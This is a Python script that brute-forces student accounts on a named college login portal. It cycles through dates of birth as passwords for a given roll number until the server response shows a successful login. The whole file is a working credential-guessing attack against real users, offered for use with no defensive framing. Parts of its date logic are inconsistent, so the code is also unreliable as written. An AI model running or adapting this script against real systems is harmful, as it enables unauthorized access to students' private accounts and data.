import requests
from default_parameters import default_data, \
    StudentLogin__VIEWSTATE, StudentLogin__EVENTVALIDATION, colors_list
import random
import sys


def colors():
    return random.choice(colors_list)


class StudentLogin(object):

    def __init__(self, url="http://studentlogin.kcgcollege.ac.in/", **kwargs):
        self.name = self.__class__.__name__
        print(self.name)
        print(self.__class__)
        self.URL = url
        self.default_data = default_data
        self.default_data["__VIEWSTATE"] = StudentLogin__VIEWSTATE
        self.default_data["__EVENTVALIDATION"] = StudentLogin__EVENTVALIDATION

    def verify_data(self, roll_no, dob, *args):
        """
        Method for data verification to get the parameters
        roll number, Date of Birth and any optional arguments for the request.
        :param roll_no:
        :param dob:
        :param args:
        :return:
        """
        self.default_data["txtuname"] = roll_no
        self.default_data.update({"txtpassword": str(dob)})
        request = requests.get(url=self.URL, params=self.default_data)
        request.raise_for_status()
        if request.status_code != 204:
            try:
                if request.text.__contains__("sessionStorage.getItem"):
                    return True
                return False
            except ValueError:
                raise ValueError("Some request is invalid...")


def start_work():
    url = input("Enter URL: ")
    roll_no = input("Enter Roll Number: ")
    start_year = int(input("Enter start year: "))
    end_year = int(input("Enter end year: "))
    found = False
    student = StudentLogin(url=url)
    while not found:
        for year in range(start_year, end_year + 1):
            for month in range(6, 12 + 1):
                sys.stdout.write(f"{colors()}Processing Data - {roll_no}\n")
                for date in range(1, 31 + 1):
                    if month < 10:
                        found = student.verify_data(str(roll_no), f"0{date}0{month}{year}") if date < 10 \
                            else student.verify_data(str(roll_no), f"{date}0{month}{year}")
                        if found: return f"{date}0{month}{year}"
                    else:
                        found = student.verify_data(str(roll_no), f"0{date}{month}{year}") if date < 10 \
                            else student.verify_data(str(roll_no), f"{date}{month}{year}")
                        if found: return f"0{date}{month}{year}"


if __name__ == "__main__":
    student = StudentLogin()
    #print(f"\n\nPassword: \033[92m{start_work()}")
